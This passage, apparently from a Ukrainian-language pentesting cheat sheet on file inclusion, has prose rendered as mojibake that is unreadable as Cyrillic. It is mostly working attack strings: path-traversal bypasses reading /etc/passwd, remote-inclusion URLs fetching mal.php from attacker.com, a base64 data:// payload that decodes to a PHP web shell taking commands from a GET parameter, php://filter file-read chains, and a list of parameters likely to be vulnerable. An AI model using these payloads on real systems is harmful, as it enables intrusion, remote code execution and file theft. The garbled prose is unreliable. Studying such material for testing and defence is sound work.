* **–ü–æ—á–∞—Ç–æ–∫ –∑ —Ñ–∞–ª—å—à–∏–≤–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó**: –¶–µ –ø–æ—à–∏—Ä–µ–Ω–∞ –ø—Ä–∞–∫—Ç–∏–∫–∞ –ø–æ—á–∏–Ω–∞—Ç–∏ —à–ª—è—Ö –∑ –Ω–µ—ñ—Å–Ω—É—é—á–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó (—è–∫-–æ—Ç `a/`). –¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —è–∫ –∑–∞–ø–æ–±—ñ–∂–Ω–∏–π –∑–∞—Ö—ñ–¥ –∞–±–æ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∏–º–æ–≥ –ª–æ–≥—ñ–∫–∏ –ø–∞—Ä—Å–∏–Ω–≥—É —à–ª—è—Ö—ñ–≤ —Å–µ—Ä–≤–µ—Ä–∞.

–ü—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫ —Å–∫–æ—Ä–æ—á–µ–Ω–Ω—è —à–ª—è—Ö—ñ–≤ –≤–∞–∂–ª–∏–≤–æ —Ä–æ–∑—É–º—ñ—Ç–∏ –ø–æ–≤–µ–¥—ñ–Ω–∫—É –ø–∞—Ä—Å–∏–Ω–≥—É —à–ª—è—Ö—ñ–≤ —Å–µ—Ä–≤–µ—Ä–∞ —Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É —Ñ–∞–π–ª–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏. –ö–æ–∂–µ–Ω —Å—Ü–µ–Ω–∞—Ä—ñ–π –º–æ–∂–µ –≤–∏–º–∞–≥–∞—Ç–∏ —Ä—ñ–∑–Ω–æ–≥–æ –ø—ñ–¥—Ö–æ–¥—É, —ñ —á–∞—Å—Ç–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è, —â–æ–± –∑–Ω–∞–π—Ç–∏ –Ω–∞–π–±—ñ–ª—å—à –µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–π –º–µ—Ç–æ–¥.

**–¶—é –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –±—É–ª–æ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ PHP 5.3.**

### **–¢—Ä—é–∫–∏ –æ–±—Ö–æ–¥—É —Ñ—ñ–ª—å—Ç—Ä—ñ–≤**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

–í php —Ü–µ –≤–∏–º–∫–Ω–µ–Ω–æ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, –æ—Å–∫—ñ–ª—å–∫–∏ **`allow_url_include`** —î **–í–∏–º–∫–Ω–µ–Ω–æ.** –í—ñ–Ω –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ **–£–≤—ñ–º–∫–Ω–µ–Ω–æ** –¥–ª—è —Ç–æ–≥–æ, —â–æ–± —Ü–µ –ø—Ä–∞—Ü—é–≤–∞–ª–æ, —ñ –≤ —Ç–∞–∫–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –º–æ–≥–ª–∏ –± –≤–∫–ª—é—á–∏—Ç–∏ PHP —Ñ–∞–π–ª –∑ –≤–∞—à–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
–Ø–∫—â–æ –∑ —è–∫–æ—ó—Å—å –ø—Ä–∏—á–∏–Ω–∏ **`allow_url_include`** —É–≤—ñ–º–∫–Ω–µ–Ω–æ, –∞–ª–µ PHP **—Ñ—ñ–ª—å—Ç—Ä—É—î** –¥–æ—Å—Ç—É–ø –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫, [–∑–≥—ñ–¥–Ω–æ –∑ —Ü–∏–º –ø–æ—Å—Ç–æ–º](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—Ä–æ—Ç–æ–∫–æ–ª –¥–∞–Ω–∏—Ö –∑ base64 –¥–ª—è –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è b64 PHP –∫–æ–¥—É —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
–£ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –∫–æ–¥—ñ —Ñ—ñ–Ω–∞–ª—å–Ω–∏–π `+.txt` –±—É–≤ –¥–æ–¥–∞–Ω–∏–π, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø–æ—Ç—Ä—ñ–±–µ–Ω —Ä—è–¥–æ–∫, —è–∫–∏–π –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è –Ω–∞ `.txt`, —Ç–æ–º—É —Ä—è–¥–æ–∫ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è —Ü–∏–º, —ñ –ø—ñ—Å–ª—è –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è b64 —Ü—è —á–∞—Å—Ç–∏–Ω–∞ –ø–æ–≤–µ—Ä–Ω–µ –ø—Ä–æ—Å—Ç–æ —Å–º—ñ—Ç—Ç—è, –∞ —Ä–µ–∞–ª—å–Ω–∏–π PHP –∫–æ–¥ –±—É–¥–µ –≤–∫–ª—é—á–µ–Ω–æ (—ñ, –æ—Ç–∂–µ, –≤–∏–∫–æ–Ω–∞–Ω–æ).
{% endhint %}

–Ü–Ω—à–∏–π –ø—Ä–∏–∫–ª–∞–¥ **–±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø—Ä–æ—Ç–æ–∫–æ–ª—É `php://`** –±—É–¥–µ:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Root element

–í Python –≤ –∫–æ–¥—ñ, –ø–æ–¥—ñ–±–Ω–æ–º—É –¥–æ —Ü—å–æ–≥–æ:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
–Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –ø–µ—Ä–µ–¥–∞—î **–∞–±—Å–æ–ª—é—Ç–Ω–∏–π —à–ª—è—Ö** –¥–æ **`file_name`**, **–ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —à–ª—è—Ö –ø—Ä–æ—Å—Ç–æ –≤–∏–¥–∞–ª—è—î—Ç—å—Å—è**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
–¶–µ –æ—á—ñ–∫—É–≤–∞–Ω–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> –Ø–∫—â–æ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç —î –∞–±—Å–æ–ª—é—Ç–Ω–∏–º —à–ª—è—Ö–æ–º, –≤—Å—ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ –≤—ñ–¥–∫–∏–¥–∞—é—Ç—å—Å—è, —ñ –∑'—î–¥–Ω–∞–Ω–Ω—è –ø—Ä–æ–¥–æ–≤–∂—É—î—Ç—å—Å—è –∑ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞ –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ —à–ª—è—Ö—É.

## Java –°–ø–∏—Å–æ–∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ–π

–°—Ö–æ–∂–µ, —â–æ —è–∫—â–æ —É –≤–∞—Å —î Path Traversal –≤ Java —ñ –≤–∏ **–∑–∞–ø–∏—Ç—É—î—Ç–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é** –∑–∞–º—ñ—Å—Ç—å —Ñ–∞–π–ª—É, **–ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è —Å–ø–∏—Å–æ–∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó**. –¶–µ –Ω–µ –≤—ñ–¥–±—É–≤–∞—Ç–∏–º–µ—Ç—å—Å—è –≤ —ñ–Ω—à–∏—Ö –º–æ–≤–∞—Ö (–Ω–∞—Å–∫—ñ–ª—å–∫–∏ –º–µ–Ω—ñ –≤—ñ–¥–æ–º–æ).

## –¢–æ–ø 25 –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤

–û—Å—å —Å–ø–∏—Å–æ–∫ –∑ 25 –Ω–∞–π–∫—Ä–∞—â–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–∏–º–∏ –¥–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ (LFI) (–∑ [–ø–æ—Å–∏–ª–∞–Ω–Ω—è](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é PHP –æ–±–≥–æ—Ä—Ç–æ–∫ —Ç–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤

### php://filter

PHP —Ñ—ñ–ª—å—Ç—Ä–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –±–∞–∑–æ–≤—ñ **–æ–ø–µ—Ä–∞—Ü—ñ—ó –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö** –ø–µ—Ä–µ–¥ —ó—Ö —á–∏—Ç–∞–Ω–Ω—è–º –∞–±–æ –∑–∞–ø–∏—Å–æ–º. –Ñ 5 –∫–∞—Ç–µ–≥–æ—Ä—ñ–π —Ñ—ñ–ª—å—Ç—Ä—ñ–≤:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: –í–∏–¥–∞–ª—è—î —Ç–µ–≥–∏ –∑ –¥–∞–Ω–∏—Ö (–≤—Å–µ –º—ñ–∂ —Å–∏–º–≤–æ–ª–∞–º–∏ "<" —Ç–∞ ">")
* –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ–π —Ñ—ñ–ª—å—Ç—Ä –∑–Ω–∏–∫ –∑ —Å—É—á–∞—Å–Ω–∏—Ö –≤–µ—Ä—Å—ñ–π PHP
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : –ü–µ—Ä–µ—Ç–≤–æ—Ä—é—î –≤ —ñ–Ω—à—É –∫–æ–¥—É–≤–∞–Ω–Ω—è(`convert.iconv.<input_enc>.<output_enc>`). –©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **—Å–ø–∏—Å–æ–∫ –≤—Å—ñ—Ö –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω–∏—Ö –∫–æ–¥—É–≤–∞–Ω—å**, –∑–∞–ø—É—Å—Ç—ñ—Ç—å —É –∫–æ–Ω—Å–æ–ª—ñ: `iconv -l`

{% hint style="warning" %}
–ó–ª–æ–≤–∂–∏–≤–∞—é—á–∏ —Ñ—ñ–ª—å—Ç—Ä–æ–º –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è `convert.iconv.*`, –≤–∏ –º–æ–∂–µ—Ç–µ **–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π —Ç–µ–∫—Å—Ç**, —â–æ –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –∑–∞–ø–∏—Å—É –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç—É –∞–±–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫–∞ –≤–∫–ª—é—á–∞—î –ø—Ä–æ—Ü–µ—Å –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ —Ç–µ–∫—Å—Ç—É. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [**LFI2RCE —á–µ—Ä–µ–∑ php —Ñ—ñ–ª—å—Ç—Ä–∏**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: –°—Ç–∏—Å–∫–∞—î –≤–º—ñ—Å—Ç (–∫–æ—Ä–∏—Å–Ω–æ, —è–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –±–∞–≥–∞—Ç–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó)
* `zlib.inflate`: –†–æ–∑–ø–∞–∫–æ–≤—É—î –¥–∞–Ω—ñ
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : –ó–∞—Å—Ç–∞—Ä—ñ–ª–∏–π
* `mdecrypt.*` : –ó–∞—Å—Ç–∞—Ä—ñ–ª–∏–π
* –Ü–Ω—à—ñ —Ñ—ñ–ª—å—Ç—Ä–∏
* –ó–∞–ø—É—Å—Ç–∏–≤—à–∏ –≤ php `var_dump(stream_get_filters());`, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫—ñ–ª—å–∫–∞ **–Ω–µ–æ—á—ñ–∫—É–≤–∞–Ω–∏—Ö —Ñ—ñ–ª—å—Ç—Ä—ñ–≤**:
* `consumed`
* `dechunk`: —Å–∫–∞—Å–æ–≤—É—î –∫–æ–¥—É–≤–∞–Ω–Ω—è HTTP chunked
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
–ß–∞—Å—Ç–∏–Ω–∞ "php://filter" –Ω–µ—á—É—Ç–ª–∏–≤–∞ –¥–æ —Ä–µ–≥—ñ—Å—Ç—Ä—É
{% endhint %}

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—ñ–ª—å—Ç—Ä—ñ–≤ php —è–∫ –æ—Ä–∞–∫—É–ª–∞ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤

[**–£ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) –ø—Ä–æ–ø–æ–Ω—É—î—Ç—å—Å—è —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ —Ñ–∞–π–ª—É –±–µ–∑ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –≤–∏—Ö–æ–¥—É –≤—ñ–¥ —Å–µ—Ä–≤–µ—Ä–∞. –¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –±–∞–∑—É—î—Ç—å—Å—è –Ω–∞ **–ª–æ–≥—ñ—á–Ω—ñ–π –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó —Ñ–∞–π–ª—É (—Å–∏–º–≤–æ–ª –∑–∞ —Å–∏–º–≤–æ–ª–æ–º) –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º —Ñ—ñ–ª—å—Ç—Ä—ñ–≤ php** —è–∫ –æ—Ä–∞–∫—É–ª–∞. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ —Ñ—ñ–ª—å—Ç—Ä–∏ php –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –∑–±—ñ–ª—å—à–µ–Ω–Ω—è —Ç–µ–∫—Å—Ç—É –Ω–∞—Å—Ç—ñ–ª—å–∫–∏, —â–æ–± php –≤–∏–∫–ª–∏–∫–∞–≤ –≤–∏–∫–ª—é—á–µ–Ω–Ω—è.

–£ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–º—É –ø–æ—Å—Ç—ñ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥–µ—Ç–∞–ª—å–Ω–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —Ç–µ—Ö–Ω—ñ–∫–∏, –∞–ª–µ –æ—Å—å —à–≤–∏–¥–∫–∏–π –ø—ñ–¥—Å—É–º–æ–∫:

* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∫–æ–¥–µ–∫ **`UCS-4LE`**, —â–æ–± –∑–∞–ª–∏—à–∏—Ç–∏ –≤–µ–¥—É—á–∏–π —Å–∏–º–≤–æ–ª —Ç–µ–∫—Å—Ç—É –Ω–∞ –ø–æ—á–∞—Ç–∫—É —ñ –∑—Ä–æ–±–∏—Ç–∏ —Ä–æ–∑–º—ñ—Ä —Ä—è–¥–∫–∞ –µ–∫—Å–ø–æ–Ω–µ–Ω—Ü—ñ–π–Ω–æ –±—ñ–ª—å—à–∏–º.
* –¶–µ –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó **—Ç–µ–∫—Å—Ç—É –Ω–∞—Å—Ç—ñ–ª—å–∫–∏ –≤–µ–ª–∏–∫–æ–≥–æ, –∫–æ–ª–∏ –ø–æ—á–∞—Ç–∫–æ–≤–∞ –ª—ñ—Ç–µ—Ä–∞ –≤–≥–∞–¥–∞–Ω–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ**, —â–æ php –≤–∏–∫–ª–∏—á–µ **–ø–æ–º–∏–ª–∫—É**.
* –§—ñ–ª—å—Ç—Ä **dechunk** **–≤–∏–¥–∞–ª–∏—Ç—å –≤—Å–µ, —è–∫—â–æ –ø–µ—Ä—à–∏–π —Å–∏–º–≤–æ–ª –Ω–µ —î —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–º**, —Ç–æ–º—É –º–∏ –º–æ–∂–µ–º–æ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ —î –ø–µ—Ä—à–∏–π —Å–∏–º–≤–æ–ª —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–º.
* –¶–µ, –≤ –ø–æ—î–¥–Ω–∞–Ω–Ω—ñ –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º (—ñ —ñ–Ω—à–∏–º–∏ —Ñ—ñ–ª—å—Ç—Ä–∞–º–∏ –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ –≤–≥–∞–¥–∞–Ω–æ—ó –ª—ñ—Ç–µ—Ä–∏), –¥–æ–∑–≤–æ–ª–∏—Ç—å –Ω–∞–º –≤–≥–∞–¥–∞—Ç–∏ –ª—ñ—Ç–µ—Ä—É –Ω–∞ –ø–æ—á–∞—Ç–∫—É —Ç–µ–∫—Å—Ç—É, —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—é—á–∏, –∫–æ–ª–∏ –º–∏ —Ä–æ–±–∏–º–æ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω—å, —â–æ–± –≤–æ–Ω–∞ –±—ñ–ª—å—à–µ –Ω–µ –±—É–ª–∞ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–º —Å–∏–º–≤–æ–ª–æ–º. –¢–æ–º—É —â–æ, —è–∫—â–æ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–π, dechunk –Ω–µ –≤–∏–¥–∞–ª–∏—Ç—å –π–æ–≥–æ, –∞ –ø–æ—á–∞—Ç–∫–æ–≤–∞ –±–æ–º–±–∞ –≤–∏–∫–ª–∏—á–µ –ø–æ–º–∏–ª–∫—É php.
* –ö–æ–¥–µ–∫ **convert.iconv.UNICODE.CP930** –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î –∫–æ–∂–Ω—É –ª—ñ—Ç–µ—Ä—É –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—É (—Ç–∞–∫ —â–æ –ø—ñ—Å–ª—è —Ü—å–æ–≥–æ –∫–æ–¥–µ–∫–∞: a -> b). –¶–µ –¥–æ–∑–≤–æ–ª—è—î –Ω–∞–º –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ —î –ø–µ—Ä—à–∞ –ª—ñ—Ç–µ—Ä–∞ `a`, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ç–æ–º—É —â–æ —è–∫—â–æ –º–∏ –∑–∞—Å—Ç–æ—Å—É—î–º–æ 6 –∑ —Ü—å–æ–≥–æ –∫–æ–¥–µ–∫–∞ a->b->c->d->e->f->g, –ª—ñ—Ç–µ—Ä–∞ –±—ñ–ª—å—à–µ –Ω–µ —î —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–º —Å–∏–º–≤–æ–ª–æ–º, –æ—Ç–∂–µ, dechunk –Ω–µ –≤–∏–¥–∞–ª–∏–≤ —ó—ó, —ñ –ø–æ–º–∏–ª–∫–∞ php –≤–∏–∫–ª–∏–∫–∞–Ω–∞, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–∞ –º–Ω–æ–∂–∏—Ç—å—Å—è –∑ –ø–æ—á–∞—Ç–∫–æ–≤–æ—é –±–æ–º–±–æ—é.
* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–Ω—à—ñ –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫ **rot13** –Ω–∞ –ø–æ—á–∞—Ç–∫—É, –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ —ñ–Ω—à—ñ —Å–∏–º–≤–æ–ª–∏, —Ç–∞–∫—ñ —è–∫ n, o, p, q, r (—ñ —ñ–Ω—à—ñ –∫–æ–¥–µ–∫–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –ø–µ—Ä–µ–º—ñ—â–µ–Ω–Ω—è —ñ–Ω—à–∏—Ö –ª—ñ—Ç–µ—Ä —É —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–π –¥—ñ–∞–ø–∞–∑–æ–Ω).
* –ö–æ–ª–∏ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π —Å–∏–º–≤–æ–ª —î —á–∏—Å–ª–æ–º, –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–∫–æ–¥—É–≤–∞—Ç–∏ –π–æ–≥–æ –≤ base64 —ñ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ 2 –ø–µ—Ä—à—ñ –ª—ñ—Ç–µ—Ä–∏, —â–æ–± –≤–∏—Ç—è–≥–Ω—É—Ç–∏ —á–∏—Å–ª–æ.
* –û—Å—Ç–∞—Ç–æ—á–Ω–∞ –ø—Ä–æ–±–ª–µ–º–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, **—è–∫ –≤–∏—Ç—è–≥—Ç–∏ –±—ñ–ª—å—à–µ, –Ω—ñ–∂ –ø–æ—á–∞—Ç–∫–æ–≤–∞ –ª—ñ—Ç–µ—Ä–∞**. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—ñ–ª—å—Ç—Ä–∏ –ø–æ—Ä—è–¥–∫—É –ø–∞–º'—è—Ç—ñ, —Ç–∞–∫—ñ —è–∫ **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE**, –º–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏ –ø–æ—Ä—è–¥–æ–∫ —Å–∏–º–≤–æ–ª—ñ–≤ —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ –Ω–∞ –ø–µ—Ä—à—ñ–π –ø–æ–∑–∏—Ü—ñ—ó —ñ–Ω—à—ñ –ª—ñ—Ç–µ—Ä–∏ —Ç–µ–∫—Å—Ç—É.
* –Ü –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **–¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–∞–Ω—ñ**, —ñ–¥–µ—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± **–∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ 2 –±–∞–π—Ç–∏ —Å–º—ñ—Ç—Ç—î–≤–∏—Ö –¥–∞–Ω–∏—Ö –Ω–∞ –ø–æ—á–∞—Ç–∫—É** –∑ **convert.iconv.UTF16.UTF16**, –∑–∞—Å—Ç–æ—Å—É–≤–∞—Ç–∏ **UCS-4LE**, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ **–æ–ø–æ—Ä–Ω–∏–º –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏–º–∏ 2 –±–∞–π—Ç–∞–º–∏**, —ñ **–≤–∏–¥–∞–ª–∏—Ç–∏ –¥–∞–Ω—ñ –¥–æ —Å–º—ñ—Ç—Ç—î–≤–∏—Ö –¥–∞–Ω–∏—Ö** (—Ü–µ –≤–∏–¥–∞–ª–∏—Ç—å –ø–µ—Ä—à—ñ 2 –±–∞–π—Ç–∏ –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ —Ç–µ–∫—Å—Ç—É). 